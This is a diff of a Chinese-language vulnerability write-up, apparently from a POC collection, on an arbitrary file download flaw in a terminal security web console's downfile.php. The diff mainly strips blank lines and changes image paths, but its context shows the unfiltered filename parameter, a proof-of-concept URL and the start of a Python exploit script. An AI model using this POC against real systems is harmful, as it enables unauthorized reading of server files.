@@ -18,11 +18,7 @@ title="在线安装-V8+终端安全系统Web控制台"
 
 ## 漏洞复现
 
-
-
 存在漏洞的文件 **/Console/htmltopdf/downfile.php**
-
-
 
 ```php
 <?php	
@@ -40,29 +36,17 @@ title="在线安装-V8+终端安全系统Web控制台"
 			?>
 ```
 
-
-
 文件中没有任何的过滤 通过filename参数即可下载任意文件
-
-
 
 POC为
 
-
-
-```plain
+```
 http://xxx.xxx.xxx.xxx/htmltopdf/downfile.php?filename=downfile.php
 ```
 
-
-
-![](images/202202091833924.png)
-
-
+![](../.gitbook/assets/202202091833924.png)
 
 ## 漏洞POC
-
-
 
 ```python
 import requests
@@ -103,7 +87,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-
-
-![](images/202202091833854.png)
-
+![](../.gitbook/assets/202202091833854.png)
